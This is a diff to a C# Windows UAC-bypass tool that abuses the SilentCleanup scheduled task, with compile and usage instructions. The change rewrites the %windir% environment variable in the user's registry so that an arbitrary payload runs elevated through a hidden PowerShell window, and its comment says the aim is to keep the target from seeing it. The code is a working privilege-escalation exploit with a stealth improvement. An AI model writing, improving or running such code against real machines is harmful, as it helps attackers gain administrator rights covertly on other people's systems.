@@ -3,6 +3,9 @@ Created by: Julio Ureña (plaintext)
 Twitter: @JulioUrena
 Website: https://plaintext.do
 
+Modified on 3/20/20 by Kevin Murphy (0xhexmex) to execute a payload with powershell.exe without spawning
+a new window on the target's desktop
+
 Compile: csc.exe uac_bypass_silentcleanup.cs
 Usage: uac_bypass_silentcleanup.exe C:\Path\To\Payload.exe
 
@@ -40,7 +43,7 @@ namespace UACBypass_SilentCleanup
                 // Registry Key Modification
                 RegistryKey key;
                 key = Registry.CurrentUser.CreateSubKey(@"Environment");
-                key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);
+                key.SetValue("windir", "powershell.exe -w hidden -c \"Start-Process -NoNewWindow " + payload + "\" # ", RegistryValueKind.String);
                 key.Close();
 
                 Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
